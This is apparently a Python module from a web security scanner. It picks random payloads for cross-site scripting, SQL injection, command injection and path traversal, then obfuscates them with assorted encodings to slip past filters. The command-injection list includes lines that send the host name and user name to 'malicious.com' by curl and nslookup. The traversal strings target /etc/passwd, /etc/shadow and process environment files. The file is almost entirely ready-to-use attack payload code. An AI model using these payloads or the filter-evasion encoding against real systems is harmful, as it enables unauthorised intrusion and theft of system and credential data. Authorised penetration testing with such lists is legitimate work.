import random
import urllib.parse
import hashlib
from config import settings
from loguru import logger

def _obfuscate(payload: str) -> str:
    """Apply multiple obfuscation techniques with random selection"""
    techniques = [
        lambda x: x,
        lambda x: urllib.parse.quote(x),
        lambda x: ''.join(f'&#{ord(c)};' for c in x),
        lambda x: ''.join(f'%{ord(c):02x}' for c in x),
        lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
        lambda x: ''.join(f'%u{ord(c):04x}' for c in x),
        lambda x: hashlib.md5(x.encode()).hexdigest()[:len(x)],
        lambda x: ''.join([f'%{hex(ord(c))[2:]}' for c in x]),
        lambda x: ''.join([f'&#x{hex(ord(c))[2:]};' for c in x]),
        lambda x: ''.join([f'\\x{hex(ord(c))[2:]}' for c in x]),
    ]
    return random.choice(techniques)(payload)

def polymorphic_xss_payload() -> str:
    base_payloads = [
        '<script>alert(document.domain)</script>',
        '"><script>alert(window.origin)</script>',
        '<img src=x onerror=alert(location.href)>',
        '<svg/onload=alert(navigator.userAgent)>',
        'javascript:alert`1`',
        '\'"<iframe/onload=alert(origin)>',
        '"><body onload=alert(1)>',
        '<details/open/ontoggle=alert(1)>',
        '<svg><script>alert&#40;1&#41</script>',
    ]
    return _obfuscate(random.choice(base_payloads))

def polymorphic_sqli_payload() -> str:
    base_payloads = [
        "' OR SLEEP(5)-- ",
        "' UNION SELECT @@version,NULL,NULL-- ",
        "'; SELECT PG_SLEEP(5)--",
        "' OR 1=1 LIMIT 1-- ",
        "') OR EXISTS(SELECT * FROM information_schema.tables)--",
        "' AND 1=CAST((SELECT version()) AS INTEGER)--"
    ]
    return _obfuscate(random.choice(base_payloads))

def polymorphic_cmd_injection_payload() -> str:
    base_payloads = [
        '; echo $(id)',
        '&& curl http://malicious.com/$(hostname)',
        '| nslookup $(whoami).malicious.com',
        '`echo RCE_SUCCESS`',
        '|| ping -c 3 127.0.0.1',
        '$(echo vulnerable > /tmp/proof)'
    ]
    return _obfuscate(random.choice(base_payloads))

def polymorphic_path_traversal_payload() -> str:
    base_payloads = [
        '../../../../../../etc/passwd%00',
        '..%2f..%2f..%2f..%2f..%2f..%2fWindows/win.ini',
        '%2e%2e%2f' * 8 + 'etc/shadow',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '/proc/self/environ',
        '....//....//....//etc/passwd'
    ]
    return _obfuscate(random.choice(base_payloads))
